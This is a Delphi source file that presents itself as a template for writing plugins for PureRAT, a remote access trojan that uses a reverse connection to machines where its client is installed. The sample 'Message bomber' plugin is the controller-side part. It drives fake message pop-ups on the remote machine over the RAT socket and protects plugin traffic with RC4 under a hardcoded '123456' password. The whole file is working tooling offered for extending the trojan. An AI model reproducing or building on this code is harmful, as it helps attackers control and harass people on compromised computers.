{
	This example show you how to create your own plugins for PureRAT.
	Respect everything and follow all comments to be sure that all will work fine. Thank you!
	
	-> wrh1d3
}

library MessageBonmber;

uses
  Windows,
  SysUtils,
  Forms,
  SocketUnitEx in '..\Utils\SocketUnitEx.pas',
  UnitRC4 in '..\Utils\UnitRC4.pas',
  UnitMain in 'UnitMain.pas' {FormMain};

//Constants for plugin infos
const
  //Kind of plugin you can create for PureRAT
  PluginType: array[0..2] of string = ('Client', 'Builder', 'Server'); //(*)

  //Main plugin infos
  PluginName = 'Message bomber O_O';
  PluginAuthor = 'wrh1d3';
  PluginDescription = 'Display a given number of fake messages';
  PluginVersion = '1.0.0.0';

  //Both server an client must have same plugin id
  PluginId = 'Message bomber O_O - v1.0.0.0';

  //Custom datas encryption password, for sure you must use the same for both server and client parts!
  PluginPassword = '123456';

  //[NOTE]
  
  {(*) PureRAT use a reverse connection model, so the client is the part
     installed on remote machine, the builder is the client builder on main application and
		 the server the main application itself}
	      	
//Plugin variables		
var
  Socket: Integer;
  //these variables are needed to establsh connection to PureRAT server

//Function to retrieve plugin infos
function PluginInfos: PChar; stdcall;
begin
  Result := PChar(PluginName + '|' +
                  PluginAuthor + '|' +
                  PluginDescription + '|' +
                  PluginVersion + '|' +
                  PluginType[2] + '|' + //Specify the plugin type by index (2 -> Server) 
                  PluginId + '|');
end;
//-----

//Function to initialize variables
procedure PluginOptions(_Socket: Integer); stdcall;
begin
  Socket := _Socket;
end;
//-----

//Get client part feedback
procedure PluginFeedBack(_FeedBack: PChar); stdcall;
begin
  FormMain.GetFeedBack(_FeedBack);
end;
//-----

//Function to be executed
procedure PluginFunction; stdcall;
var
  Msg: TMsg;
begin
  FormMain := TFormMain.Create(Application);
  FormMain.SetInfos(Socket, PluginPassword);
  FormMain.Show;

  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
end;
//-----

// Don't edit following lines!!
exports
  PluginInfos,    //Infos about plugin
	PluginOptions,  //Variables initialization  
	PluginFeedBack,  //Client feedback
  PluginFunction;	//Function to execute

begin
end.

